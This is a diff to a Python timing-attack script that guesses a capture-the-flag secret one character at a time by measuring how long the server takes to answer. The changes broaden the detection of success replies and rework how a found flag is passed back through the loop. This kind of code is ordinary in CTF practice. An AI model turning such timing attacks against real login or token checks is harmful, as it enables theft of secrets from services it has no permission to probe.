@@ -40,8 +40,10 @@ def connect_and_send(flag_attempt):
         
         elapsed = end - start
         
-        # Check if we got the flag
-        if "✅" in response or "CORRECT" in response or "Access granted" in response:
+        # Check if we got the flag (look for success indicators)
+        if ("✅" in response or "CORRECT" in response.upper() or 
+            "Access granted" in response or "SUCCESS" in response.upper() or
+            "You got it" in response or "congratulations" in response.lower()):
             return elapsed, response, True
         
         return elapsed, response, False
@@ -54,6 +56,7 @@ def find_next_char(known_flag):
     print(f"\nCurrent: {known_flag}")
     
     timings = {}
+    success_flag = None
     
     # Try each character in the charset
     for char in CHARSET:
@@ -65,12 +68,16 @@ def find_next_char(known_flag):
             elapsed, response, is_correct = connect_and_send(test_flag)
             
             if is_correct:
-                print(f"\n🎉 FOUND THE FLAG: {test_flag}")
-                return None  # Signal that we found it
+                print(f"\n🎉 FOUND THE CORRECT FLAG: {test_flag}")
+                success_flag = test_flag
+                break
             
             if elapsed > 0:
                 times.append(elapsed)
             time.sleep(0.05)  # Small delay between attempts
+        
+        if success_flag:
+            return ('SUCCESS', success_flag)
         
         if times:
             avg_time = sum(times) / len(times)
@@ -101,12 +108,17 @@ def timing_attack():
         if known_flag.endswith(FLAG_SUFFIX):
             break
             
-        next_char = find_next_char(known_flag)
+        result = find_next_char(known_flag)
         
-        if next_char is None:
-            # Either we found the flag or failed
+        if result is None:
+            print("Attack failed - no character found!")
             break
         
+        # Check if we found the complete flag
+        if isinstance(result, tuple) and result[0] == 'SUCCESS':
+            return result[1]
+        
+        next_char = result
         known_flag += next_char
         print(f"\n{'='*60}")
         print(f"FLAG SO FAR: {known_flag}")
